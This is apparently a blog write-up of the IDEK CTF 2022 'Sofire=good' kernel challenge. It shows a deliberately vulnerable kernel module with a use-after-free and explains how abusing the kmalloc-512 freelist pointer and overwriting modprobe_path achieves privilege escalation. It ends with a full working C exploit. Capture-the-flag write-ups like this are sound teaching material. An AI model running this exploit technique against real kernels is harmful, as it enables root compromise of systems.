---
layout: post
author: zafirr
title:  "IDEK CTF 2022 Sofire=good writeup"
description: "Kernel heap freelist is easier to exploit than tcache"
date: 2023-01-22
last_modified_at: 2023-01-22
categories: writeup
lang: en
tags:
    - pwn
    - kernel exploitation
    - ctf
---

## English
Last weekend, me and my team [Project Sekai](https://twitter.com/ProjectSEKAIctf), participated in idek ctf 2022 (held in 2023 cause it got delayed). Crazily, we won the entire CTF, and I ended with 3 first bloods in the pwn category!!! (and 1 second blood). One of the challenges was Sofire=good. This challenge was a kernel challenge, exploiting a UAF in the kmalloc-512 general cache. The author's solution was to use msg_msg, but I had a simpler solution of abusing the kernel free list.

### The challenge
This is the source of the kernel module (some parts removed for brevity):

```c
#define sofirium_art "  :!J5PPP5J!:\n 75PPPP55PPP57\nJPPPP!:!!JPPPPJ\nPPPPP!^~~7PPPPP\nJPPPP7!!:~PPPPJ\n 75PPP55PPPP57\n  :!J5PPP5J!:\n"
#define CHUNK_SIZE 0x100

typedef struct sofirium_head{
    char coin_art[0x70];
    struct sofirium_entry* head;
    int total_nft;
} sofirium_head;

typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

sofirium_head * head;

long device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    sofirium_entry* next;
    sofirium_entry* new;
    sofirium_entry* target;
    sofirium_entry* tmp;
    request req;
    int total_nft;

    if (copy_from_user(&req, (void*)arg, sizeof(request))) {
        printk(KERN_INFO "Copy Request from User Error");
        return -EFAULT;
    }

    switch (cmd) {
        case 0x1337:
            debug_print(KERN_INFO "Deleting Blockchain: Sofirium is Bad");

            next = head->head;
            total_nft= head->total_nft;
            kfree(head);

            for (int i = 0; i < total_nft; i ++){
                debug_print(KERN_INFO "Freeing Buffer 0x%px\nNEXT: 0x%px", tmp, next->next);
                tmp = next;
                next = next->next;
                kfree(tmp);
            }
            return 1;

        case 0xdeadbeef:
            if (head == NULL){
                head = kmalloc(sizeof(sofirium_head), GFP_KERNEL);
                head->total_nft = 0;
                strlcpy(head->coin_art, sofirium_art, sizeof(head->coin_art));

                printk(KERN_INFO "%s", head->coin_art);

                head->head = NULL;
                debug_print(KERN_INFO "Head NULL, Creating sofirium_head at 0x%px", head);
            }
            if (head->total_nft == 0){
                new = kmalloc(sizeof(sofirium_entry), GFP_KERNEL);
                new->next = NULL;
                memcpy(new->nft, req.buffer, CHUNK_SIZE);
                head->head = new;
                head->total_nft = 1; 
            }
            else{
                target = head->head;
                for (int i=1; i < head->total_nft; i++){
                    target = target->next;
                }
                new = kmalloc(sizeof(sofirium_entry), GFP_KERNEL);
                new->next = NULL;
                memcpy(new->nft, req.buffer, CHUNK_SIZE);
                target->next = new;
                head->total_nft ++;
            }
            debug_print(KERN_INFO "NEW NFT: %s @ 0x%px \n",new->nft, new);
            return head->total_nft;

        case 0xcafebabe:
            target = head->head;
            for (int i=0; i < req.idx; i++){
                debug_print(KERN_INFO "Walked over entry 0x%px", target->next);
                target = target->next;
            };

            debug_print(KERN_INFO "Copy to user %s @ 0x%px", target->nft, target->nft);
            if(copy_to_user((void*)arg+offsetof(struct request, buffer),target->nft, sizeof(target->nft))){
                printk(KERN_INFO "Copy to user failed, exiting");
                return -EFAULT;
            }
            return 0;

        case 0xbabecafe:
            target = head->head;
            for (int i=0; i < req.idx; i++){
                debug_print(KERN_INFO "Walked over entry %px", target->next);
                target = target->next;
            };

            if(copy_from_user(target->nft, (void*)arg+offsetof(struct request, buffer),sizeof(target->nft))){
                printk(KERN_INFO "Copy from user failed exiting");
                return -EFAULT;
            }
            debug_print(KERN_INFO "Copy from user %s to 0x%px", target->nft, target->nft);

            return 0;
        default:
            return 0xffff;
    }
}
```

The 4 cases are:

* 0x1337 -> delete the entire nft linked list
* 0xdeadbeef -> Init head if not null, init next node in linked list
* 0xcafebabe -> Copy value of nft at index i to user
* 0xbabecafe -> Edit value of nft at index i from user

basic CRUD stuff you might see in a basic heap challenge.

### The bug
The bug is simple, in the "delete" case, the head and the nodes are not nulled!

```c
case 0x1337:
    debug_print(KERN_INFO "Deleting Blockchain: Sofirium is Bad");

    next = head->head;
    total_nft= head->total_nft;
    kfree(head); // Not NULLed

    for (int i = 0; i < total_nft; i ++){
        debug_print(KERN_INFO "Freeing Buffer 0x%px\nNEXT: 0x%px", tmp, next->next);
        tmp = next;
        next = next->next;
        kfree(tmp); // Not NULLed
    }

    return 1;
```

This means we have a basic UAF.

Next thing to note is the size of the data allocated for an NFT

```c
#define CHUNK_SIZE 0x100

typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;
.
.
.
new = kmalloc(sizeof(sofirium_entry), GFP_KERNEL);
```

This means we run kmalloc(264), round to the larger cache, this means we kmalloc onto the kmalloc-512 cache. At this point we can try to find objects that might get allocated to that cache to abuse, but thats too much of a hassle, so I tried to find a different way.

### Quirk of the kernel heap free list
According to https://lore.kernel.org/linux-mm/202003051624.AAAC9AECC@keescook/t/, the heap next free chunk in a freed chunk is NOT at the beginning of the chunk (unlike how glibc heap works), but instead its in the middle of the chunk. This is to prevent freelist corruption with heap overflow, but this might be useful for us.

> This is a good spot to pause if you would like to figure it out for yourself!

<br>
<br>
<br>

### Why is that useful?
The sofirium_entry struct stores a pointer in the beginning of the struct, and we have a 256 bytes sized char array after it. If the pointer to the next free chunks is in the middle, this means its at around offset 256. Oh, our char array reads/writes from byte 8 to 264, thats a perfect amount!

With this, we can overwrite the pointer to the next free chunk, and potentially get arbitrary read and write. Now, there are some protections to this, like freelist randomization, and preventing write to outside of the heap area, but I just took a risk and assumed they weren't being used. Guess what? They weren't :)

### The plan
With this, the plan is:

* Leak heap area of kmalloc-512
* Leak kernel base 
* Write to modprobe_path

Leaking the area of kmalloc-512 is easy, since we print bytes 8 to 264, we can easily print the next free chunk pointer in a freed chunk. To leak and and write to modprobe_path, we can abuse an overlapped chunk. This is done by leaking the heap first, then changing the pointer to be inside another chunk.

For example, say we had chunk A B and C, and the free list was C->B->A. If we edit C first, we can change the pointer to point INSIDE B. This gives us access to edit the pointer in a sofirium chunk.

The first pointer in the sofirium chunk is so helpful, as we can change it to read and write anywhere, as it effectively changes the next chunk location in the nft linked list. With this we can try to search the kmalloc-512 cache for a kernel leak, and then write to modprobe path.

### Thats it
Thats it tbh. From there you can follow [this](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) guide by Midas to get priv escalation by overwritting modprobe_path. Very fun chall!

### Notes
Some things I noted during exploiting this:

* The overlapped chunk has to be aligned to 0x100. This still breaks sometimes, but it NEVER worked if it wasnt aligned
* Allocation is random, so the kernel leak isnt consistant, and it may take some bruteforcing. My exploit works about 1/10 times

Here's the full script:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define CHUNK_SIZE 0x100

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
}

int main(int argc, char *argv[])
{
    puts("ASDF");
    int global_fd = open("/dev/Sofire", O_RDONLY);
    request data;
    data.idx = 0;
    strncpy(data.buffer, "AAAA", CHUNK_SIZE);
    int a = ioctl(global_fd, 0xdeadbeef, &data);   
    strncpy(data.buffer, "BBBB", CHUNK_SIZE); 
    a = ioctl(global_fd, 0xdeadbeef, &data);   
    strncpy(data.buffer, "CCCC", CHUNK_SIZE);  
    a = ioctl(global_fd, 0xdeadbeef, &data);
    a = ioctl(global_fd, 0x1337, &data);

    unsigned long long *p = &data.buffer;
    data.idx = 0;
    a = ioctl(global_fd, 0xcafebabe, &data);
    unsigned long long leak0 = p[CHUNK_SIZE / 8 - 1];
    data.idx = 2;
    a = ioctl(global_fd, 0xcafebabe, &data);
    unsigned long long leak1 = p[CHUNK_SIZE / 8 - 1];
    printf("0x%llx 0x%llx\n", leak0, leak1);

    data.idx = 2;
    unsigned long long fake = leak1 + 0x100;
    
    p[CHUNK_SIZE / 8 - 1] = fake;
    p[0] = 0x43434343;
    a = ioctl(global_fd, 0xbabecafe, &data);
    strncpy(data.buffer, "DDDD", CHUNK_SIZE);
    a = ioctl(global_fd, 0xdeadbeef, &data);
    p[0] = 0x45454545;
    a = ioctl(global_fd, 0xdeadbeef, &data);

    p[0] = 0x42424242;
    p[CHUNK_SIZE / 8 - 1] = leak0 + 0x400;
    data.idx = 1;
    a = ioctl(global_fd, 0xbabecafe, &data);

    data.idx = 4;
    a = ioctl(global_fd, 0xcafebabe, &data);
    for (int i = 0; i < CHUNK_SIZE / 8; i ++){
        printf("0x%llx\n", p[i]);
    }
    unsigned long long modprobe_path = p[7] + 0x629ce0;
    printf("0x%llx\n", modprobe_path);


    p[0] = 0x42424242;
    p[CHUNK_SIZE / 8 - 1] = modprobe_path-0x10;
    data.idx = 1;
    a = ioctl(global_fd, 0xbabecafe, &data);

    data.idx = 4;
    strncpy(data.buffer, "AAAAAAAA/tmp/x\x00", CHUNK_SIZE);
    a = ioctl(global_fd, 0xbabecafe, &data);
    get_flag();

    // After that you cat /tmp/flag

    return 0;
}
```

### Final words
Thanks for the great CTF idek! Unexpected result tbh, wasnt expecting pjsk to win, but after 48 hours of tryharding we did it!

Cant wait for idek CTF 2023!